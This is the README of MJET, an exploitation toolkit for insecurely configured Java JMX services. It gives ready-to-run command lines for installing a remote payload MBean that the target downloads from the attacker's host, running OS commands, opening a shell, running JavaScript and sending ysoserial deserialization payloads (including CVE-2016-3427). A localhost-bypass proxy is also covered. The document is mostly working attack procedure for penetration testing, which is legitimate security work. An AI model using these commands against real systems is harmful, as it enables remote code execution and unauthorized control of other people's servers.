# MJET by MOGWAI LABS

MOGWAI LABS JMX Exploitation Toolkit

MJET is a fork of [sjet](https://github.com/siberas/sjet/), which was developed by siberas but is no longer actively maintained. MJET is maintained by the MOGWAI LABS team which also provided most of the original sjet codebase.


MJET allows an easy exploitation of insecure configured JMX services. Additional background
information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) and [here](https://www.owasp.org/images/c/c1/JMX_-_Java_Management_Extensions_-_Hans-Martin_Muench.pdf).

## Prerequisites

* [Jython 2.7](https://www.jython.org/)
* [Ysoserial](https://github.com/frohoff/ysoserial) (for exploiting deserialisation vulnerabilities via JMX)
* [opendmk_jmxremote_optional_jar-1.0-b01-ea.jar](https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea) (to support the alternative JMX Message Protocol (JMXMP))

## Usage

MJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):

```
jython mjet.py targetHost targetPort MODE password (modeOptions)
```
Where

* **targetHost** -  the target IP address
* **targetPort** - the target port where JMX is running
* **MODE** - the script mode
* **modeOptions** - the options for the mode selected

Authentication support (if JMX authentication is enabled):
* **--jmxrole** - the username
* **--jmxpassword** - the password

Other optional arguments:
* **--jmxmp** - Use JMX-MP (requires to load an additional JAR)
* **--localhost_bypass** - service port for the proxy in localhost bypass
* **--shell** - Use defined shell
* **--rmiObjectName** - RMI name of the JMX endpoint 

### Modes and modeOptions

* **install** - installs the payload in the current target
  * *password* - the password that should be set after successful installation
  * *payload_url* - full URL to load the payload
  * *payload_port* - port to load the payload
* **uninstall** - uninstalls the payload from the current target
* **changepw** -  change the password on a already deployed payload
  * *password* - the password to access the installed MBean
  * *newpass* - The new password
* **command** -  runs the command *CMD* in the targetHost
  * *password* - the password to access the installed MBean
  * *CMD* - the command to run
* **shell** - starts a simple shell in targetHost (with the limitations of java's Runtime.exec())
  * *password* - the password to access the installed MBean
* **javascript** - runs a javascript file *FILENAME* in the targetHost
  * *password* - the password to access the installed MBean
  * *FILENAME* - the javascript to be run
* **deserialize** - send a ysoserial payload to the target
  * *gadget* - gadget as provided by ysoserial, e.g., CommonsCollections6
  * *cmd* - command to be executed
* **webserver** - just run the MLET web server
  * *payload_url* - full URL to load the payload
  * *payload_port* - port to load the payload

## Examples


### Installing the payload MBean on a vulnerable JMX service

In the following example, the vulnerable JMX service runs on 10.165.188.23 port 2222, the attacker has
the IP address 10.165.188.1. The JMX service will connect to the web service of the attacker to download
the payload jar file. MJET will start the necessary web service on port 8000.

After the successful installation of the MBean, the default password is changed to the password that was provided
at the command line ("super_secret").

```
h0ng10@rocksteady ~/w/mjet> java -jar jython-standalone-2.7.0.jar mjet.py 10.165.188.23 2222 install super_secret http://10.165.188.1:8000 8000

### Running the command 'ls -la' in a Linux target:

After the payload was installed, we can use it to execute OS commands on the target.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 command super_secret "ls -la"

### Running in shell mode

If you don't want to load Java for every command, you can use the "shell mode"
to get a limited command shell.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 shell super_secret

### Invoke a JavaScript payload on a target:

The example script "javaproperties.js" displays the Java properties of the vulnerable
service. It can be invoked as follows:

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 javascript super_secret scripts/javaproperties.js

```

### Change the password

Change the existing password ("super_secret") to "this-is-the-new-password":

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 changepw super_secret this-is-the-new-password

```

### Uninstall the payload MBean from the target


Uninstall the payload MBean 'MogwaiLabs' from the target:

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 uninstall

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================

[+] Connected: rmi://10.165.188.1  8
[+] MBean correctly uninstalled
[+] Done

```

### Exploit Java deserialization with ysoserial

Exploit Java deserialization with ysoserial on target:
The file ysoserial.jar must be present in the MJET directory.
You can select any ysoserial payload as you like, similar to the original ysoserial calls.

This attack even works if JMX authentication is enabled and the user has "readonly" permissions.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py --jmxrole user --jmxpassword userpassword 10.165.188.23 2222 deserialize CommonsCollections6 "touch /tmp/xxx"

[+] Done

```

### Exploit CVE-2016-3427: JMX authentication with Java deserialization

Exploit CVE-2016-3427 with ysoserial:
The file ysoserial.jar must be present in the MJET/jar directory.
You can select any ysoserial payload as you like, similar to the original ysoserial calls.

```bash
$ java -jar jython.jar mjet.py 127.0.0.1 9999 cve-2016-3427 CommonsCollections6 "touch /tmp/xxx"

MJET - MOGWAI LABS JMX Exploitation Toolkit

[+] Done
```

Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427

### Webserver only mode

It is also possible to just run the web server that provides the MLET code and the JAR file with the payload MBean
```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 webserver http:/xxxx/xxxx 8000

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Starting webserver at port 8000
[+] Press Enter to stop the service

```

### JMX message protocol (JMXMP) support

Download [opendmk_jmxremote_optional_jar-1.0-b01-ea.jar](https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea) and move it into the jars directory. You need to add this directory to the classpath via `java -cp`.

```bash
java -cp "jython.jar:jars/*" org.python.util.jython mjet.py shell mypass
```

### Localhost bypass

It sometimes happens that the RMI registry exposes a RemoteObject that is only accessible on localhost (example @127.0.0.1:45401). However, the port is open where the RemoteObject is accessible over the network. 

```bash
$ nmap -sVC 172.17.0.2 -p 9999,45401

Starting Nmap 7.60 ( https://nmap.org ) at 2020-03-24 16:48 CET
Nmap scan report for 172.17.0.2
Host is up (0.00035s latency).

PORT      STATE SERVICE     VERSION
9999/tcp  open  java-rmi    Java RMI Registry
| rmi-dumpregistry: 
|   jmxrmi
|      implements javax.management.remote.rmi.RMIServer, 
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @127.0.0.1:45401
|             extends
|_              java.rmi.server.RemoteObject
45401/tcp open  rmiregistry Java RMI
```
It is still possible to exploit this service by using the `--localhost_bypass <PORT>` option. In the following example, we use port 45401. This will start a TCP proxy on localhost and forward the traffic to the targetHost on the supplied port.
```bash
$ jython mjet.py --localhost_bypass 45401 172.17.0.2 9999 install mypass http://172.17.0.1:6666 6666

``` 

### Custom RMI Object Name
Sometimes it happens that the RMI object name of the JMX endpoint is not jmxrmi, in this case the parameter --rmiObjectName can be used to specify the appropriate RMI object name, for example --rmiObjectName=customJmxRmi.
```bash
$ jython mjet.py --rmiObjectName=customJmxRmi 172.17.0.2 2222 super_secret install http://172.17.0.1:8000 8000

$  
```

### Using own defined Shell
Sometimes it happens that the target system does not provide a /bin/bash or cmd.exe shell. In this case the optional parameter --shell can be specified, for example --shell="bash -c". By executing the javascript javaproperties.js with mjet.py, more details about the environment are given. 
```
$ jython mjet.py --shell="bash -c" 10.165.188.23 2222 command super_secret "ls -la"
